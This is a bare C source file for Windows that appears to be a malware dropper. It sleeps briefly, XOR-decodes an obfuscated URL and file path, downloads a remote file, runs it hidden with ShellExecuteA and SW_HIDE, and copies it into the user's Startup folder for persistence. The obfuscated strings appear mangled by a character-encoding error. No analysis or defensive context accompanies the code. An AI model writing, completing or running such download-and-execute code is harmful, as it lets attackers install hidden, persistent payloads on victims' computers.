#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <stdio.h>
int main() {
    Sleep(2163);
    char url[512] = "бччз░┘┘цзэ·└нещдфекн└чбцдахьекнхкдн└иег┘÷ГХ└пцз";
    char save_path[512] = "И░ЖЖЩцднещыЖЖЧогзЖЖнещдфекнон└оро";
    for (int i = 0; i < strlen(url); i++) {
        url[i] ^= 0xAA;
    }
    for (int i = 0; i < strlen(save_path); i++) {
        save_path[i] ^= 0xAA;
    }
    HRESULT hr = URLDownloadToFileA(NULL, url, save_path, 0, NULL);
    if (SUCCEEDED(hr)) {
        ShellExecuteA(NULL, "open", save_path, NULL, NULL, SW_HIDE);
    }
    Sleep(6633);
    char startup_path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", startup_path, MAX_PATH);
    strcat(startup_path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\CysQpmRyvX.exe");
    CopyFileA(save_path, startup_path, FALSE);

    return 0;
}
